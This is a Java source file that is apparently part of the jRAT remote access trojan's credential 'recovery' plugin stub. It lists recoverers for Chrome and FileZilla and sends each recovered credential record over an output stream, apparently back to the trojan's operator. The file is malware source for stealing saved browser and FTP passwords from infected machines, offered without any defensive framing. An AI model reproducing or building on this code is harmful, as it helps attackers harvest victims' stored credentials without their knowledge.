package jrat.plugin.recovery.stub;

import java.io.DataOutputStream;
import java.util.List;

import jrat.plugin.recovery.stub.programs.AbstractRecoverer;
import jrat.plugin.recovery.stub.programs.Chrome;
import jrat.plugin.recovery.stub.programs.FileZilla;

public class Recovery {
	
	public static final AbstractRecoverer[] RECOVERERS = new AbstractRecoverer[] {
		new Chrome(),
		new FileZilla()
	};
	
	public static void dump(DataOutputStream dos) throws Exception {
		for (AbstractRecoverer r : RECOVERERS) {
			try {
				List<String[]> list = r.recover();
				
				if (list != null) {
					for (String[] a : list) {
						dos.writeShort(RecoveryPlugin.HEADER);
						dos.writeShort(r.getName().length());
						dos.writeChars(r.getName());
						dos.writeShort(a.length);
						
						for (String s : a) {
							dos.writeShort(s.length());
							dos.writeChars(s);
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
